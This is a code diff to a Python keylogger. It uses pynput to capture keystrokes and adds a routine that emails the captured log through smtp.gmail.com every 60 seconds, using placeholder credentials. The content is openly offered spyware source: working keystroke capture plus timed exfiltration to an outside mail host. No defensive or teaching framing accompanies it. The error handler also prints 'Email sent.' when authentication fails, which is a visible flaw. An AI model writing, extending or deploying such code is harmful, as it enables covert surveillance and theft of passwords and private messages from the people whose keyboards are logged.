@@ -1,11 +1,14 @@
 from pynput.keyboard import Key, Controller, Listener
-# from threading import Timer
+from smtplib import SMTP, SMTPAuthenticationError
+from threading import Timer
 # from datetime import datetime
 
 
 EMAIL_ADDRESS = "YOUR_EMAIL"
 EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD"
 SEND_REPORT_EVERY = 60  # as in seconds
+EMAIL_HOST = "smtp.gmail.com"
+PORT = 587
 
 
 class Keylogger:
@@ -34,9 +37,27 @@ class Keylogger:
             return False
         self.update_log(name.replace("'", ""))
 
+    def send_email(self):
+        try:
+            server = SMTP(host=EMAIL_HOST, port=PORT)
+            # connect to the SMTP server as TLS mode
+            server.starttls()
+            server.login(self.email, self.password)
+            server.sendmail(self.email, self.email, f"\n\n{self.log}")
+            server.quit()
+        except SMTPAuthenticationError:
+            print("Email sent.")
+
+    def report(self):
+        self.send_email()
+        self.log = ""
+        timer = Timer(self.interval, self.report)
+        timer.start()
+
     def start(self):
         # collect events until released
         with Listener(on_release=self.on_release) as listener:
+            self.report()
             listener.join()
 
 
